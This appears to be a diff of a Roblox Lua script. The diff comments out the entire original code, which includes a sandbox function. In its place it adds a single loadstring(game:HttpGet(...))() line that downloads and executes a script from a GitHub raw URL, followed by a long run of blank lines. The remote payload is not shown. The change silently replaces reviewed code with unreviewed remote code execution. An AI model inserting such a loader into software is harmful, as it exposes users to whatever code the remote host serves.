@@ -1,4 +1,39 @@
-function sandbox(var,func)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/loanen/base/main/mainscript'))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[function sandbox(var,func)
 	local env = getfenv(func)
 	local newenv = setmetatable({},{
 		__index = function(self,k)
@@ -184,4 +219,4 @@ for i,v in pairs(cors) do
 	spawn(function()
 		pcall(v)
 	end)
-end
+end]]
